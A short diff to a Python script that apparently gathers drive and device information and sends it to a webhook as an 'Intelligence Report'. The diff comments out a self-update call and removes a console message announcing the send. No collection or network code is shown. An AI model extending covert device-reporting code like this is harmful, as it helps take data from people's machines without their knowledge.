@@ -62,7 +62,7 @@ def download_latest_script():
     except Exception as e:
         print(f"[-] Error updating script: {e}")
 
-check_for_updates()
+#check_for_updates()
 
 # Function to get drive information
 def get_drive_info():
@@ -164,7 +164,6 @@ except Exception as e:
 current_time_iso = datetime.now().isoformat()
 
 def send_device_information():
-        print("Sending webhook...")
         embed = {
             "title": "Intelligence Report",
             "description": "WIA",
